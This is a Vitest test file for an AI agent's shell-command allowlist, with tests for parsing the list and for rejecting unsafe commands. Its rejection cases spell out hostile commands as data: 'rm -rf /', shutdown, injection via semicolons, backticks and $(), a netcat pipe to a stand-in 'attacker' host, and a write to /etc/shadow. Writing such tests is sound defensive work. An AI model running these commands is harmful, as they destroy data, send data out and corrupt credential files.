import { describe, expect, it } from "vitest";
import {
  defaultAllowlistText,
  isCommandSafe,
  parseAllowlist,
} from "../../src/backend/agent/allowlist.js";

describe("parseAllowlist", () => {
  it("falls back to the default list when the setting is empty", () => {
    const list = parseAllowlist("");
    expect(list.prefixes).toContain("ls");
    expect(list.prefixes).toContain("docker ps");
    expect(list.prefixes.length).toBeGreaterThan(10);
  });

  it("parses comma and newline separated entries, lowercased", () => {
    const list = parseAllowlist("LS, uptime\nDocker PS\n# comment");
    expect(list.prefixes).toEqual(["ls", "uptime", "docker ps"]);
  });
});

describe("isCommandSafe", () => {
  const allowlist = parseAllowlist(defaultAllowlistText());

  it("allows exact and prefixed matches", () => {
    expect(isCommandSafe("ls", allowlist)).toBe(true);
    expect(isCommandSafe("ls -la /var/log", allowlist)).toBe(true);
    expect(isCommandSafe("  cat /etc/hostname  ", allowlist)).toBe(true);
    expect(isCommandSafe("docker ps -a", allowlist)).toBe(true);
  });

  it("rejects unknown commands", () => {
    expect(isCommandSafe("rm -rf /", allowlist)).toBe(false);
    expect(isCommandSafe("shutdown now", allowlist)).toBe(false);
    expect(isCommandSafe("", allowlist)).toBe(false);
  });

  it("does not let a prefix bleed into a longer word", () => {
    // "ps" must not match "psql ..."
    expect(isCommandSafe("psql_drop_database", allowlist)).toBe(false);
    // "find" must not match "findstr" style words
    expect(isCommandSafe("findx", allowlist)).toBe(false);
  });

  it("rejects commands that smuggle a second command", () => {
    expect(isCommandSafe("ls; rm -rf /", allowlist)).toBe(false);
    expect(isCommandSafe("cat /etc/passwd && shutdown now", allowlist)).toBe(
      false,
    );
    expect(isCommandSafe("ls | nc attacker 4444", allowlist)).toBe(false);
    expect(isCommandSafe("echo `rm -rf /`", allowlist)).toBe(false);
    expect(isCommandSafe("ls $(reboot)", allowlist)).toBe(false);
    expect(isCommandSafe("cat foo > /etc/shadow", allowlist)).toBe(false);
    expect(isCommandSafe("cat foo < /dev/urandom", allowlist)).toBe(false);
  });

  it("respects a custom user allowlist", () => {
    const custom = parseAllowlist("uptime");
    expect(isCommandSafe("uptime -p", custom)).toBe(true);
    expect(isCommandSafe("ls", custom)).toBe(false);
  });
});
